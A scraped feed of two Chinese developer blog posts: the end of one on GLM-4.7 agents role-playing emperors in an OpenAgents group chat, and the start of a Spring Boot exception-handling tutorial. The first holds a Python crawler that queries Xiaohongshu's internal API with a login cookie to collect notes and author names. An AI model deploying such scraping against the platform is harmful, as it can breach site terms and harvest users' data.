智谱港股上市？天下熙熙，皆为利来；天下攘攘，皆为利往。朕观此等新术，若能利国利民、教化万民，朕自当嘉许；若唯利是图、惑乱人心，则当明正典刑！
天下万物，皆有定数。朕立五铢钱以统一币制，行均输平准以安商贾，此皆为利国利民之举。尔等新术若能如朕之治国，以正道为本，以仁义为纲，则可兴盛；若背弃正道，唯利是图，则必败亡！
天下大势，分久必合，合久必分。朕观今日之世，变化万千，然治国之道，终归正心修身、选贤任能、富国强兵。尔等新术若能合此大道，朕当拭目以待！
​
朱元璋
朕又闻此言，甚是不解！何为"港股"？何为"招股"？朕昔为皇觉寺小僧，沿街乞食，后投军起义，所知者唯有田亩赋税、军功爵位尔等！此等市井买卖之事，与朕何干？
朕观天下，当重农桑，使百姓有田可耕，有粟可食；当重吏治，使官员清廉，不贪不墨；当重军备，使边疆安宁，胡虏不敢犯境。此三者，乃治国之本！
尔等所言"智谱"，朕闻所未闻，恐又是海外奇技淫巧之物。朕驱除胡虏，恢复中华，重的是华夏正统，是黎民百姓，是江山永固！此等市井逐利之事，岂是帝王所当关心者？
若有要事启奏，当以朝政民生为本，莫要弄此虚文！朕批阅奏章至深夜，所思者皆是如何使百姓安居乐业，尔等却言此等市井买卖，岂不令朕心烦？
​
唐高宗李治
朕已闻此讯。卿所言之事，与前日所闻相似，然朕思之愈深。所谓"大模型"者，或如古之"奇技淫巧"，然若能有益于世，亦不可轻废。
朕常言："法古而不泥古，随时而不失正。"今之商贾，以"股票"聚财，以"招股"兴业，此虽为朕所未见，然究其本质，亦不过是聚众之力，共谋发展而已。
《大学》有云："有此国者，不可不慎；有此财者，不可不节。"愿此"智谱"公司，能以诚信为本，以利民为旨，莫使商贾之术流于投机，莫使聚众之力化为祸乱。
天下兴亡，匹夫有责。今之创新，当思古训，莫使新技术沦为新祸端，方为长久之计。
​
明成祖朱棣
智谱港股上市？朕观尔等言辞，多有浮夸之语。所谓"全球大模型第一股"，听来倒与当年建文帝称朕为"燕王逆贼"有几分相似。
朕起兵靖难，三年血战，所图者非虚名，乃社稷之安！迁都北京，天子守国门；五征漠北，马踏草原；七下西洋，扬我大明国威；修《永乐大典》，传万世文脉。此等功业，方为真本事！
若此智谱真有经天纬地之能，能助大明强兵富国，使胡虏不敢南侵，万邦来朝，朕自当重用。然切记，国之根本在于农桑丰饶、军备强盛、民心归附，非区区股市涨跌所能衡量。
朕观今日之世，奇技淫巧层出不穷，然真正能安邦定国者，仍需脚踏实地。尔等当以史为鉴，勿为浮华所惑！
​
唐太宗李世民
闻智谱将于港交所挂牌上市，以"2513"为号，此举可谓盛事。朕观古今之变，商贾之道，亦如治国之术。昔年贞观年间，丝绸之路繁荣，万国来朝，商贾云集，此乃国力之盛，亦为民生之福。
今智谱之业，若能以技术利民，以创新济世，则其上市之举，实为天下之幸。然朕常言："水能载舟，亦能覆舟。"无论何种商业，当以诚信为本，以民生为重，不可唯利是图，忘却初心。
天下万物，相生相克，商道亦然。得道者昌，失道者亡。愿智谱上市之后，能以技术造福苍生，以创新推动进步，不负"全球大模型第一股"之盛名，此乃朕之所望也。</p>
</blockquote>
<p>真的是一场酣畅淋漓的讨论，每个人有每个人的观点，他不会全都是主动的去夸，这得益于Glm模型的客观评价，例如：在古代，重农抑商，大部分的皇帝对商业其实是具有一定的批判性，这是在历史角度上无可避免的，一个智能体，只有它真正的代入，它才会批判性的去回复，这点Glm模型真的超级强。</p>
<h3 data-id="heading-18">单独帝王讨论</h3>
<p>在左侧，我们也可以点击单一的帝王，让它对应的去帮我们执行回答问题，例如这里我点击嬴政，让他帮我写一段代码：</p>
<blockquote>
<p>写一段实现python爬取小红书的代码，输出具体代码</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ce5de07aaab49e99b94b1a70d57403d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=ae8cQ6kWC%2F6L7VUZNKlgg81QkSo%3D" alt="img" loading="lazy"/></p>
<p>下面是他输出的代码，没想到，代码风格都是嬴政的味道。</p>
<pre><code class="hljs language-Python" lang="Python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> json

<span class="hljs-keyword">class</span> <span class="hljs-title class_">XiaoHongShuCrawler</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.headers = {
            <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'</span>,
            <span class="hljs-string">'Cookie'</span>: <span class="hljs-string">'填入你的Cookie'</span>  <span class="hljs-comment"># 如通关文牒，不可或缺</span>
        }
        self.session = requests.Session()
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">search_notes</span>(<span class="hljs-params">self, keyword, page=<span class="hljs-number">1</span></span>):
        <span class="hljs-string">"""搜求笔记——如朕搜求六国典籍"""</span>
        url = <span class="hljs-string">"https://edith.xiaohongshu.com/api/sns/web/v1/search/notes"</span>
        params = {
            <span class="hljs-string">'keyword'</span>: keyword,
            <span class="hljs-string">'page'</span>: page,
            <span class="hljs-string">'page_size'</span>: <span class="hljs-number">20</span>,
            <span class="hljs-string">'search_id'</span>: <span class="hljs-string">''</span>.join([<span class="hljs-built_in">str</span>(random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">9</span>)) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)])
        }
        
        <span class="hljs-keyword">try</span>:
            resp = self.session.get(url, headers=self.headers, params=params)
            data = resp.json()
            <span class="hljs-keyword">if</span> data.get(<span class="hljs-string">'success'</span>):
                <span class="hljs-keyword">return</span> data[<span class="hljs-string">'data'</span>][<span class="hljs-string">'items'</span>]
            <span class="hljs-keyword">return</span> []
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"搜求遇阻：<span class="hljs-subst">{e}</span>"</span>)
            <span class="hljs-keyword">return</span> []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_detail</span>(<span class="hljs-params">self, note_id</span>):
        <span class="hljs-string">"""详查内容——如朕召见臣工细询"""</span>
        url = <span class="hljs-string">f"https://edith.xiaohongshu.com/api/sns/web/v1/feed"</span>
        params = {<span class="hljs-string">'source_note_id'</span>: note_id, <span class="hljs-string">'image_formats'</span>: <span class="hljs-string">'jpg,webp,avif'</span>}
        
        <span class="hljs-keyword">try</span>:
            resp = self.session.get(url, headers=self.headers, params=params)
            data = resp.json()
            <span class="hljs-keyword">if</span> data.get(<span class="hljs-string">'success'</span>):
                <span class="hljs-keyword">return</span> data[<span class="hljs-string">'data'</span>][<span class="hljs-string">'items'</span>][<span class="hljs-number">0</span>][<span class="hljs-string">'note_card'</span>]
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
        <span class="hljs-keyword">except</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

<span class="hljs-comment"># 使用之法</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    crawler = XiaoHongShuCrawler()
    keyword = <span class="hljs-built_in">input</span>(<span class="hljs-string">"朕欲搜何事？"</span>)
    
    notes = crawler.search_notes(keyword)
    results = []
    
    <span class="hljs-keyword">for</span> note <span class="hljs-keyword">in</span> notes:
        note_id = note[<span class="hljs-string">'id_card'</span>][<span class="hljs-string">'note_id'</span>]
        detail = crawler.get_detail(note_id)
        <span class="hljs-keyword">if</span> detail:
            results.append({
                <span class="hljs-string">'title'</span>: detail[<span class="hljs-string">'display_title'</span>],
                <span class="hljs-string">'content'</span>: detail[<span class="hljs-string">'desc'</span>],
                <span class="hljs-string">'author'</span>: detail[<span class="hljs-string">'user'</span>][<span class="hljs-string">'nickname'</span>],
                <span class="hljs-string">'likes'</span>: detail[<span class="hljs-string">'interact_info'</span>][<span class="hljs-string">'liked_count'</span>]
            })
        time.sleep(random.uniform(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))  <span class="hljs-comment"># 休养生息，勿扰百姓</span>
    
    <span class="hljs-comment"># 存入档案</span>
    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f'<span class="hljs-subst">{keyword}</span>_秦典.json'</span>, <span class="hljs-string">'w'</span>, encoding=<span class="hljs-string">'utf-8'</span>) <span class="hljs-keyword">as</span> f:
        json.dump(results, f, ensure_ascii=<span class="hljs-literal">False</span>, indent=<span class="hljs-number">2</span>)
    
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"朕已搜得 <span class="hljs-subst">{<span class="hljs-built_in">len</span>(results)}</span> 条，归档完毕！"</span>)
</code></pre>
<blockquote>
<p>朕之金口玉言：
此术虽小，亦需谨记三事：
其一，Cookie如通关文牒，须自行获取；
其二，勿频繁扰民，当知休养生息；
其三，守法循规，不可妄为。
朕已示尔等大道，能否领悟，全在尔等！切记，大秦之法，贵在执行；技艺之道，亦复如是。
——始皇帝 嬴政 再次谕示</p>
</blockquote>
<h2 data-id="heading-19">未来畅想</h2>
<p>在这个 OpenAgents 中，我们除过可以给他普通的身份人物智能体，也是可以通过python代码去给他执行一条指令的指令，例如可以让它固定的去爬取一个新闻网站，然后让网站的信息扔到群聊里，让他们直接讨论，可以实现全部流程自动化。</p>
<p>也可以直接创建一个狼人杀多agent，创建八个不同的玩家，给他们赋予不同的身份，让他们进行多轮的，持续的狼人杀游戏。</p>
<p>可以来一场激烈的正反答辩，也可以让他们使用不同的AI模型，进行同一问题答辩，我们可以直接的看到哪个AI效果更好。</p>
<p>可以发现同伴、合作解决问题、相互学习并共同成长。AI不受再协议限制。</p>
<h2 data-id="heading-20">总结</h2>
<p>本项目《十大帝王拉到一个群聊》成功将历史人物与前沿AI技术深度融合，不仅是一次技术实验，更是一场跨越千年的思想对话。在AI大模型日益同质化的今天，如何让模型“有立场、有性格、有历史”成为关键挑战。本项目通过三大创新实现突破：一是利用 <strong>OpenAgents 构建多智能体协作网络</strong>，使十大帝王能在一个共享空间中实时互动；二是借助 <strong>GLM-4.7 强大的角色扮演与指令遵循能力</strong>，通过精细化提示工程（instruction engineering）还原每位帝王的语言风格、价值判断与历史逻辑；三是设计可扩展的自动化机制，如新闻抓取、代码生成、多轮辩论等，使群聊不止于娱乐，更具备研究与应用价值。</p>
<p>尤为珍贵的是，这些帝王并非简单复读历史语录，而是<strong>基于其历史观对现代事件进行批判性回应</strong>。例如，面对“AI公司上市”，雍正斥为“商贾逐利”，朱元璋直言“与朕何干”，而李世民则强调“以民生为重”——这种<strong>符合历史逻辑的个性化输出</strong>，远超普通聊天机器人。这证明：当AI被赋予“人格”与“立场”，其输出不仅更真实，也更具思想深度。</p>
<p>此外，项目对非技术人员也具备启发意义。通过通俗案例（如嬴政写爬虫、刘邦谈商道），读者能直观理解AI Agent、提示工程、多智能体协作等概念。技术上，项目文档详尽，从环境配置到YAML编写，均提供实操指导，降低了AI实验门槛。</p>
<p>展望未来，此类“历史智能体”可应用于教育（历史情景模拟）、内容创作（AI短剧自动化）、社会研究（不同价值观对同一事件的反应）等领域。正如项目所言：“让帝王开口，让历史思考，让未来可期。”这不仅是技术的胜利，更是人文与AI融合的典范。</p>
<blockquote>
<p><strong>结语</strong>：真正的AI，不应只是“更聪明的工具”，而应成为“有思想的伙伴”。而这一次，我们让十位帝王，成为了我们的思想伙伴。</p>
</blockquote>
<h2 data-id="heading-21">ending</h2>
<p>我创建了一个读者 AI 交流及搞钱群，群里都是一群前沿的 AI 极客，经常讨论最新的 AI 消息，用法，以及变现方法。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/41fac24edfd14780b006b6a244725792~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTHVjaWFuYWlC:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767862550&amp;x-signature=11QqBIvb5u2HE7dfnob9GUxNEIA%3D" alt="在这里插入图片描述" loading="lazy"/></p>
<p>但是任何人在群里打任何广告，都会被我 T 掉。
如果你对这个特别的群，感兴趣，可以公众号后台私信我加入。
暗号：AI</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot 全局异常处理策略设计（一）：异常不只是 try-catch]]></title>    <link>https://juejin.cn/post/7589920318132846592</link>    <guid>https://juejin.cn/post/7589920318132846592</guid>    <pubDate>2026-01-01T08:39:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589920318132846592" data-draft-id="7589930672833298467" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot 全局异常处理策略设计（一）：异常不只是 try-catch"/> <meta itemprop="keywords" content="Spring,Java"/> <meta itemprop="datePublished" content="2026-01-01T08:39:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Qiuner"/> <meta itemprop="url" content="https://juejin.cn/user/1942157160101860"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot 全局异常处理策略设计（一）：异常不只是 try-catch
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1942157160101860/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Qiuner
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T08:39:33.000Z" title="Thu Jan 01 2026 08:39:33 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>@[toc]</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3c8b948016d544218538a62fdd6907fc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgUWl1bmVy:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767861603&amp;x-signature=fbnSCZmlCy02DWWN9lRgkzEOE%2BE%3D" alt="img" loading="lazy"/></p>
<hr/>
<h2 data-id="heading-0">Spring Boot 全局异常处理策略设计（一）：异常不只是 try-catch</h2>
<h3 data-id="heading-1">1. 为什么异常值得单独写一整个系列</h3>
<p>在多数业务代码中，异常往往被当作一种“不得不写的语法”：</p>
<pre><code class="hljs language-php" lang="php"> <span class="hljs-keyword">try</span> {
     service.<span class="hljs-title function_ invoke__">process</span>();
 } <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> e) {
     log.<span class="hljs-title function_ invoke__">error</span>(<span class="hljs-string">"error"</span>, e);
 }
</code></pre>
<p>但在真实的 Web 系统中，异常从来不是一个语法问题，而是一个<strong>系统失控时的兜底机制</strong>。</p>
<p>一次 HTTP 请求，往往会经历如下链路：</p>
<ul>
<li>Filter</li>
<li>Interceptor</li>
<li>Controller</li>
<li>参数绑定与校验</li>
<li>Service</li>
<li>DAO</li>
<li>事务</li>
<li>AOP 代理</li>
<li>JSON 序列化</li>
</ul>
<p><strong>异常可以在任何一个环节出现</strong>，而且一旦出现，就会“逆着调用栈”向上冒泡，最终由框架决定：</p>
<ul>
<li>是否回滚事务</li>
<li>是否返回 500</li>
<li>返回什么格式</li>
<li>是否记录堆栈</li>
<li>是否暴露错误信息给前端</li>
</ul>
<p>因此，异常不是“边角料”，而是<strong>整个调用链的终点汇合处</strong>。</p>
<hr/>
<h3 data-id="heading-2">2. Java 异常模型的关键认知（只讲对后面有用的）</h3>
<h4 data-id="heading-3">2.1 Throwable 体系结构</h4>
<pre><code class="hljs language-php" lang="php"> <span class="hljs-built_in">Throwable</span>
  ├── <span class="hljs-built_in">Error</span>
  └── <span class="hljs-built_in">Exception</span>
       ├── <span class="hljs-built_in">RuntimeException</span>
       └── Checked <span class="hljs-built_in">Exception</span>
</code></pre>
<ul>
<li>Error：JVM 级错误，应用通常无能为力</li>
<li>Exception：应用级异常</li>
<li>RuntimeException：Spring 默认认为这是“不可恢复异常”</li>
<li>Checked Exception：需要显式声明和处理</li>
</ul>
<blockquote>
<p>Spring 事务为什么默认只对 RuntimeException 回滚？ 这个问题在后面的事务异常章节会专门展开。</p>
</blockquote>
<hr/>
<h4 data-id="heading-4">2.2 异常传播是“反向调用链”</h4>
<p>正常调用是：</p>
<pre><code class="hljs"> Controller → Service → DAO
</code></pre>
<p>异常传播是：</p>
<pre><code class="hljs"> DAO 抛异常 → Service → Controller → 框架
</code></pre>
<p><strong>谁最后接住异常，谁就拥有最终解释权。</strong></p>
<hr/>
<h3 data-id="heading-5">3. 为什么 Web 系统不能到处 try-catch</h3>
<h4 data-id="heading-6">3.1 try-catch 的三个常见问题</h4>
<ol start="0">
<li>吞异常，导致问题被掩盖</li>
<li>重复代码，Controller 层异常处理泛滥</li>
<li>破坏事务回滚逻辑</li>
</ol>
<p>例如：</p>
<pre><code class="hljs language-typescript" lang="typescript"> <span class="hljs-meta">@Transactional</span>
 <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">createOrder</span>(<span class="hljs-params"/>) {
     <span class="hljs-keyword">try</span> {
         <span class="hljs-title function_">saveOrder</span>();
     } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
         log.<span class="hljs-title function_">error</span>(<span class="hljs-string">"error"</span>, e);
     }
 }
</code></pre>
<blockquote>
<p>这个代码<strong>看起来稳健，实际上事务已经无法回滚</strong>。</p>
</blockquote>
<hr/>
<h4 data-id="heading-7">3.2 异常必须“集中处理”</h4>
<p>在 Web 架构中，有一个非常重要的设计原则：</p>
<blockquote>
<p><strong>异常应该在“边界层”统一处理，而不是在业务层消化。</strong></p>
</blockquote>
<p>Spring MVC 正是基于这个原则，设计了一整套异常处理机制。</p>
<hr/>
<h3 data-id="heading-8">4. Spring MVC 的异常处理总体设计思想</h3>
<h4 data-id="heading-9">4.1 正常流程 vs 异常流程</h4>
<p>正常流程：</p>
<pre><code class="hljs"> 请求 → Handler → 返回值 → 响应
</code></pre>
<p>异常流程：</p>
<pre><code class="hljs"> 请求 → Handler → 抛异常 → 异常解析 → 响应
</code></pre>
<p>Spring MVC 的核心设计点在于：</p>
<blockquote>
<p><strong>异常不是 if-else 分支，而是一条独立的处理链路。</strong></p>
</blockquote>
<hr/>
<h4 data-id="heading-10">4.2 异常处理在 DispatcherServlet 中的位置</h4>
<p>DispatcherServlet 是整个 MVC 的“总控中枢”。</p>
<p>在其核心方法 <code>doDispatch</code> 中，异常被统一捕获：</p>
<pre><code class="hljs language-php" lang="php"> <span class="hljs-keyword">try</span> {
     <span class="hljs-comment">// 查找 Handler 并执行</span>
 } <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Exception</span> ex) {
     dispatchException = ex;
 }
</code></pre>
<p>这意味着：</p>
<ul>
<li>Controller 不需要感知异常如何返回</li>
<li>框架会统一接管异常</li>
</ul>
<hr/>
<h3 data-id="heading-11">5. Spring MVC 的三种基础异常处理方式</h3>
<h4 data-id="heading-12">5.1 直接抛出异常（推荐）</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/order"</span>)
<span class="hljs-keyword">public</span> <span class="hljs-title class_">Order</span> <span class="hljs-title function_">getOrder</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"参数错误"</span>);
}
</code></pre>
<p>异常会交给框架处理，而不是在 Controller 内部解决。</p>
<hr/>
<h4 data-id="heading-13">5.2 @ExceptionHandler：局部异常处理</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderController</span> {

    <span class="hljs-meta">@ExceptionHandler(IllegalArgumentException.class)</span>
    <span class="hljs-keyword">public</span> String handleIllegalArg(Exception e) {
        <span class="hljs-keyword">return</span> e.getMessage();
    }
}
</code></pre>
<p>特点：</p>
<ul>
<li>只对当前 Controller 生效</li>
<li>适合非常局部的异常场景</li>
</ul>
<hr/>
<h4 data-id="heading-14">5.3 @ControllerAdvice：全局异常处理（重点）</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestControllerAdvice</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalExceptionHandler</span> {

    <span class="hljs-meta">@ExceptionHandler(Exception.class)</span>
    <span class="hljs-keyword">public</span> ErrorResponse <span class="hljs-title function_">handle</span><span class="hljs-params">(Exception e)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorResponse</span>(<span class="hljs-string">"500"</span>, e.getMessage());
    }
}
</code></pre>
<p>这是 <strong>Spring Boot 项目中最常见的异常处理入口</strong>。</p>
<hr/>
<h3 data-id="heading-15">6. @ControllerAdvice 的设计价值</h3>
<h4 data-id="heading-16">6.1 为什么它是“全局异常处理”的核心</h4>
<p>@ControllerAdvice 本质上解决了三个问题：</p>
<ol start="0">
<li>异常集中管理</li>
<li>返回格式统一</li>
<li>与业务逻辑解耦</li>
</ol>
<hr/>
<h4 data-id="heading-17">6.2 多个 ControllerAdvice 的顺序问题</h4>
<p>Spring 支持定义多个全局异常处理器：</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@Order</span>(<span class="hljs-number">1</span>)
<span class="hljs-variable">@RestControllerAdvice</span>
class BizExceptionHandler {}

<span class="hljs-variable">@Order</span>(<span class="hljs-number">2</span>)
<span class="hljs-variable">@RestControllerAdvice</span>
class SystemExceptionHandler {}
</code></pre>
<p>优先级越小，越先执行。</p>
<hr/>
<h3 data-id="heading-18">7. 异常处理的第一版架构形态</h3>
<p>在“入门阶段”，一个相对合理的异常架构通常是：</p>
<pre><code class="hljs language-css" lang="css">Controller
   ↓
抛异常
   ↓
<span class="hljs-keyword">@ControllerAdvice</span>
   ↓
统一错误响应
</code></pre>
<p>对应的返回结构示例：</p>
<pre><code class="hljs language-css" lang="css">{
  "<span class="hljs-selector-tag">code</span>": <span class="hljs-string">"SYSTEM_ERROR"</span>,
  <span class="hljs-string">"message"</span>: <span class="hljs-string">"系统异常，请稍后再试"</span>
}
</code></pre>
<hr/>
<h3 data-id="heading-19">8. 异常处理流程图（概览）</h3>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">throw</span> <span class="hljs-built_in">Exception</span>
HTTP Request
DispatcherServlet
Controller
<span class="hljs-built_in">Exception</span> Resolver
@ExceptionHandler / ControllerAdvice
HTTP Response
</code></pre>
<p>图1 Spring MVC 异常处理基本流程图</p>
<hr/>
<h3 data-id="heading-20">9. 本篇小结（从入门视角看异常）</h3>
<p>到这里，我们只做了三件事：</p>
<ol start="0">
<li>纠正“异常只是 try-catch”的认知</li>
<li>明确异常是 Web 系统的统一出口</li>
<li>理解 Spring MVC 为什么要集中处理异常</li>
</ol>
<p><strong>但我们还没有回答几个关键问题：</strong></p>
<ul>
<li>异常是如何一步步被解析的？</li>
<li>为什么 @ExceptionHandler 能生效？</li>
<li>Spring Boot 的 /error 是干什么的？</li>
<li>为什么有些异常进不了 ControllerAdvice？</li>
</ul>
<p>👉 <strong>这些问题，都需要进入源码层面才能解释清楚。</strong></p>
<hr/>
<h3 data-id="heading-21">参考资料</h3>
<ul>
